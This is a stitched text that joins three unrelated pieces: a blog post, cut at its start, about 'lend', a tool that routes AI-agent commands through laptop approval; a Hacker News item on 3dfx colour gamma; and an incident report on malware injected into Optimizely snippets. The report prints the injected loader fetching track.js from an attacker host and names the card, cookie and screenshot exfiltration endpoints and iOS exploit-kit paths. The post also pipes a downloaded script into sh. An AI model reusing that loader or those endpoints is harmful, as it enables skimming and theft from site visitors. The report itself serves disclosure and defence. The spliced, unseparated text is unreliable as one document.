The second is forwarding my SSH agent with ssh -A. The private keys stay on my laptop, but the VM can use every key in the agent without asking and without any record of what it signed. It also only covers SSH keys.

What I wanted was for the credentials to stay on the laptop and for the commands that need them to run there too. The agent asks to run something, I approve it with Touch ID, and the agent gets the output back.

lend #

That's where lend comes in. lend is a proxy that sits in front of your existing SSH agent, and you forward its socket in place of the real one. SSH and Git keep working like normal, and lend adds a way to run commands through an SSH agent extension.

When an agent on the VM asks to run gh, the request goes over the socket and gh runs on my laptop with my login. The token never leaves the laptop, so the agent never has it. Every request, whether it's a signature or a command, is checked against a policy on the laptop and needs my approval before anything happens.

1Remote: lend exec -- command args
2                  |
3          forwarded SSH agent socket
4                  |
5Laptop: lend agent -> policy + local approval -> local command
6                                           -> original SSH agent (signing)

The policy lives on the laptop and lists what the VM is allowed to ask for. Everything else is denied. Mine is pretty short:

 1{
 2  "default": "deny",
 3  "commands": [
 4    {"executable": "/opt/homebrew/bin/gh", "approval": "biometric:inline"}
 5  ],
 6  "ssh": {
 7    "default": "deny",
 8    "keys": [
 9      {"fingerprint": "SHA256:...", "approval": "biometric:inline"}
10    ]
11  }
12}

A rule can also take an args_prefix like ["pr", "view"] if you only want to allow some subcommands. biometric:inline puts Touch ID right in the request dialog, so I read the request and touch once to approve it. Plain biometric asks for Touch ID in a second prompt after I click Allow.

To connect, I run lend ssh from the laptop. It starts a proxy for that one connection and stops it when SSH exits:

1lend ssh --config ./policy.json -- agent-vm

I run herdr on the VM. Claude Code talks to lend through lend mcp, an MCP server with a single tool called run_local_command. The tool takes the command to run and a reason, and the reason is required:

1{
2  "mcpServers": {
3    "laptop": {"command": "lend", "args": ["mcp"]}
4  }
5}

Here I asked Claude Code on the VM for the lend repo's description. It called the tool with gh repo view, my Mac showed the request, and one touch approved it:

The dialog shows the full path to the executable, every argument, the directory it'll run in on the laptop, the reason, and what the remote process said about itself. Once I approve, gh runs on the laptop and stdout, stderr, and the exit code stream back to the agent. The reason and caller details come from the VM, so they're marked as unverified. They're there to help me decide and can't change what the policy allows.

If you'd rather skip MCP, the same request works as a plain CLI call on the VM:

1lend exec --reason "Read the repo description" -- gh repo view antoniomika/lend

Keeping the socket stable across reconnects #

herdr panes survive an SSH disconnect, but the forwarded socket belongs to that connection. When I reconnect, SSH gives me a new socket path. Agents still running in the panes keep the old SSH_AUTH_SOCK.

I use a symlink at a fixed path and update it from ~/.ssh/rc on the VM. SSH runs this before starting the shell, so it sees the socket forwarded by the new connection:

 1#!/bin/sh
 2
 3if [ -n "${SSH_AUTH_SOCK:-}" ] &&
 4    [ "$SSH_AUTH_SOCK" != "$HOME/.ssh/lend/agent.sock" ] &&
 5    "$HOME/.local/bin/lend" doctor --remote --socket "$SSH_AUTH_SOCK" --timeout 1s >/dev/null 2>&1; then
 6  install -d -m 700 "$HOME/.ssh/lend" &&
 7    ln -sfn -- "$SSH_AUTH_SOCK" "$HOME/.ssh/lend/agent.sock"
 8fi
 9
10if [ -n "${DISPLAY:-}" ] && read -r _ssh_proto _ssh_cookie; then
11  case $DISPLAY in
12    localhost:*) _ssh_display="unix:${DISPLAY#localhost:}" ;;
13    *) _ssh_display=$DISPLAY ;;
14  esac
15  printf 'add %s %s %s\n' "$_ssh_display" "$_ssh_proto" "$_ssh_cookie" | /usr/bin/xauth -q -
16fi

The check confirms the forwarded socket speaks lend before updating the link. The directory is private to my user and keeps this link separate from other agent sockets. I use lend's absolute path because this runs before my shell adds ~/.local/bin to PATH. The X11 block handles cookie setup, which SSH delegates to this file when it exists.

My ~/.bashrc checks the stable path before exporting it:

1if [ -S "$HOME/.ssh/lend/agent.sock" ] &&
2    "$HOME/.local/bin/lend" doctor --remote --socket "$HOME/.ssh/lend/agent.sock" --timeout 1s >/dev/null 2>&1; then
3  export SSH_AUTH_SOCK="$HOME/.ssh/lend/agent.sock"
4fi

New Bash shells in herdr panes pick up the stable path when it works. If the check fails, Bash leaves SSH_AUTH_SOCK alone. MCP, approval hooks, and Git inherit that path when I start them. After reconnecting, the SSH hook updates the symlink and those processes use the new socket for subsequent requests. Agents already running with an old socket path need to be restarted once with the stable path in their environment.

The SSH connection from the laptop still has to stay open. Requests fail while it's disconnected, and reconnecting starts a new lend session with fresh approvals and leases. The link points at one connection at a time, so the last update wins.

Secrets the agent never sees #

gh works because it's already logged in on my laptop. Some tools need a token passed in. For those, a command rule can read secrets with something like op read and hand them to the approved command as environment variables:

 1{
 2  "secret_reader": "/opt/homebrew/bin/op",
 3  "secret_reader_args": ["read", "--no-newline"],
 4  "commands": [
 5    {
 6      "executable": "/opt/homebrew/bin/gh",
 7      "args_prefix": ["pr", "view"],
 8      "approval": "biometric",
 9      "secrets": {"GH_TOKEN": "op://Development/github/token"}
10    }
11  ]
12}

When the agent asks to run gh pr view and I approve it, lend reads the token from 1Password, runs gh with GH_TOKEN set, and sends back the output. The token stays on the laptop. The VM can't pick which variables get set or which references get read. The prompt shows the variable names and references, and the values never show up in prompts or history.

Here's the VM running gh api user with a rule that injects GH_TOKEN. After I approve in lend, 1Password asks for its own Touch ID before op read returns the token. The VM gets my login back, and its own environment has no GH_TOKEN:

There's one catch: this only works if the approved command doesn't print its environment. If you approve env or sh, you've handed the values right back. The same goes for allowing op itself as a command, since op read prints the secret and that output goes straight to the agent.

SSH keys #

Keys get their own policy too. Keys that aren't listed are hidden from the VM, and listed keys can be limited by what they're allowed to sign. max_signatures caps how many signatures a key can make in a session.

Leases #

A rule can offer a lease when I approve, like five minutes or three uses. Leases only exist inside a lend ssh session and only match the exact command and arguments I approved. They go away when the session ends or my screen locks.

Seeing what happened #

lend status --all --watch shows what's connected, what's waiting, what's running, and any active leases. lend pause --all cancels everything and refuses new requests until I resume. lend history keeps a record of what ran and how it was approved. It leaves out arguments, output, and secrets, and you can opt into logging arguments.

Answering agent prompts from the laptop #

Agents also ask permission for things that have nothing to do with my credentials, like running a shell command on the VM, editing a file, or fetching a URL. lend approve sends those questions to the same dialog on my Mac. It doesn't run anything on the laptop. It asks me, and the agent decides what to do with the answer.

For Claude Code, it's a PermissionRequest hook on the VM:

1{
2  "hooks": {
3    "PermissionRequest": [
4      {"matcher": "*", "hooks": [{"type": "command", "command": "lend approve --hook claude-code"}]}
5    ]
6  }
7}

Now when Claude Code would normally stop and ask in the terminal, my Mac shows the command or tool input and I answer with Touch ID. The laptop policy lists which topics are allowed to ask, each with its own approval:

1"approvals": {
2  "topics": [{"name": "claude-code", "approval": "biometric:inline"}]
3}

There are adapters for Codex, Antigravity, and pi, plus a plain JSON format for anything else. You can use it in scripts too: lend approve --topic deploy --title "terraform apply" && terraform apply only applies after I approve on the laptop. If the laptop can't be reached, the hook stays out of the way and the agent asks in its own UI like it normally would.

What lend doesn't protect against #

An approved command runs as my user and can touch my files. Approval decides what runs, and lend doesn't sandbox it. If I approve a shell, an interpreter, or anything that reads instructions from stdin, I've basically approved running anything on my laptop, since stdin streams after approval and isn't shown in the prompt.

The caller details in the prompt come from the VM and can be faked. Anyone who can reach the forwarded socket on the VM, root included, can make requests while the session is open. The policy still limits what they can ask for, and every request still needs my approval.

lend is still early and runs on macOS and Linux. It doesn't allocate a PTY, so interactive programs won't work through it. On Linux, approval is a Zenity dialog or a terminal prompt, and biometric approval is macOS only.

Prior art #

ssh-rev-exec sends local execution requests through an SSH agent proxy, and op-forward forwards 1Password CLI commands to a machine with desktop authentication. lend is a separate implementation that uses the same agent extension trick and adds per-request policy, local approval, and key filtering.

Trying it #

Install lend on both your laptop and the remote host:

1brew install antoniomika/tap/lend
2# or
3curl -fsSL https://github.com/antoniomika/lend/releases/latest/download/install.sh | sh

Run lend doctor on the laptop to check your policy, executables, upstream agent, and approval setup. lend doctor --remote on the VM checks that the forwarded socket is actually lend. The getting started guide walks through a first session, and the docs cover policies, approval, and MCP. If you give it a try, I'd love to hear how it goes on GitHub.

item.title: Why 3dfx 1 cards had such a washed out color output? (272 pts)
item.description:
URL: https://twitter.com/id_aa_carmack/status/2122478083319992513, See on Hacker News

Both NeXT and 3DFX tried to “do the right thing” with color spaces, and it wound up generally making them look worse than competing options. I didn’t really understand it properly until years later. It is natural to think that a pixel with a value of 1.0 is emitting twice the photons as a pixel with a value of 0.5, so you can do the obvious linear math to calculate partial pixel coverage, blending a foreground over a background, or interpolating between colors in a texture. If displays are “linear”, that is correct. NeXT and 3DFX were much closer to linear than other contemporary displays. NeXT had crossover from the deep graphics understanding at Pixar, and 3DFX had the SGI heritage. They did this intentionally. If you have 10+ bits per channel like the professional rendering systems, linear displays are The Right Thing. Unfortunately, NeXTStation Colors were 4 bits per channel and 3DFX was 5 or 6 bits per channel, and there… it was not the right thing. Human eyes aren’t linear intensity sensors. We mostly register relative changes in intensity, so we can tell the difference between 0.01 and 0.02 as a huge doubling, while 0.99 to 1.00 is almost imperceptible. This distribution of intensities is often referred to as the “gamma” of the display system, but the actual curves like sRGB are a bit more complicated. If you only have a small number of discrete pixel values, you definitely don’t want to spread them evenly from 0 to 1! If you do, you will have good precision in the brights, but very stark “intensity bands” in the dark colors. If everything was authored specifically for 3DFX, you would still have the fundamental problem with the dark bands, but more accurate blending and filtering. The problem was that artists made all of their textures in paint programs on conventional non-linear displays, so when they were drawn by 3DFX cards, they got the characteristic “washed out color” look. You can mathematically correct textures for differences in display gamma, but I didn’t really understand the issue back in the glQuake days, and we were so enthralled by the absolute performance of 3DFX that the color fidelity didn’t get as much attention as it should have. Even today, tons of games don’t properly handle gamma across their textures and render targets. High resolutions and 24 bit color masks most of it, but you still see it in some slight shimmerings in high contrast textures and edges.

Does anybody know why 3DfX 1 cards had such a washed out color output? In my research, circa '97 I found many people complaining about the colors. Is it gamma? 16-bit color? What can it be?

item.title: Optimizely Compromised, Served Malware on Zoom, GitLab (634 pts)
item.description:
URL: https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/, See on Hacker News

  • Magecart
  • DarkSword
  • Coruna
  • Malware
  • CSP Integrity
  • JS Time Machine
  • JavaScript Integrity Monitoring
  • Script Vault
  • Script Watch

16 Nov 2026 — 14 min read

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

  1. A plain <script> tag pointing at https://1688360.cc/track.js (most snippets).
  2. The same URL hidden in base64 with atob(). A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.
  3. A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

Time Event
Sep 17 webshell.lol, the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script
Nov 09 17:52 5vobauua3ojpklx.icu registered (iOS exploit-kit router)
Nov 13 to 11-16 Earlier wave: webshell.lol/get.js injected through Kissmetrics, StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

What the payload does

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

  • page text, form fields, links and images;
  • the clipboard, on copy and through navigator.clipboard;
  • outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

  • the page URL;
  • document.cookie (cookies not marked HttpOnly);
  • the original addresses it replaced;
  • a screenshot of the page, rendered with html2canvas.

4. iOS exploit kits: Coruna and DarkSword

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

iOS version Chain
13 to 17 Coruna (/A8/, plus a direct Coruna loader at /JIUJIU888/index.js)
18.x DarkSword (/B9/, /D11/, /D12/)
26 Separate chain (/C10/); currently only fingerprints the device

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Money stolen so far

As of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040, all within roughly nine hours on the 16th:

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

Who was affected

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. Product What it would have flagged

Data Watch New data destinations: 1688360.cc/hit.php and 1688360.cc/card.php.
Frame Watch A new frame source: eil786npto9u5bq.icu, the exploit-kit iframe.
CSP Integrity + JS Time Machine + Script Vault Your Optimizely snippet's fingerprint changing, plus a brand-new script with no matching known file. The JS Time Machine shows when the new version first appeared and how long it was served.
Threat Intelligence Reports naming 5vobauua3ojpklx.icu and webshell.lol are already flagged as IoCs, as are 1688360.cc and the other hosts below once they were added.

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Did Content Security Policy help?

We crawled 256 of the affected organisations' own hosts and evaluated their CSP against what this payload needs:

  1. Load track.js from 1688360.cc.
  2. Or run the inline fallback, which needs 'unsafe-eval' or 'unsafe-inline'.
  3. Send stolen data to 1688360.cc (connect-src).
  4. Load the iOS kit (script-src, frame-src).
Result Organisations
No CSP at all 68
CSP allowed the payload and the data theft 50
Payload ran, but connect-src blocked the data theft (the address swapping still worked) 17

  • 'strict-dynamic': any script the trusted Optimizely snippet inserts is trusted too.
  • 'unsafe-eval', which Optimizely's own documentation tells customers to allow: the inline-fallback version ran through eval even where track.js was blocked. That is what happened at HSBC. Its CSP blocked track.js and the data theft, but the inline copy still ran.

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

If your site uses Optimizely Web:

  1. Open every project's Project JavaScript and every experiment's custom code. Look for 1688360.cc, atob( and any script you didn't write.
  2. Review who and what has write access to your Optimizely account (users, API tokens, integrations) and rotate credentials.
  3. If you have card fields in your own forms, treat cards entered on 16 November as potentially exposed.
  4. Treat any session tokens or secrets in non-HttpOnly cookies as exposed, and rotate them.
  5. Deploy a CSP. Restrict connect-src, avoid 'unsafe-eval' where you can, and turn on reporting.
  6. Consider if you need to communicate to your customers about having served them malware.

If you visited an affected site on 16 November:

  1. Update your iPhone or iPad to iOS 18.7.3 or later, or iOS 26.3 or later.
  2. Check any crypto transfer you made. If the address you pasted doesn't match the one you meant to pay, it may have been swapped.
  3. Watch your card statements if you paid by card on an affected site.
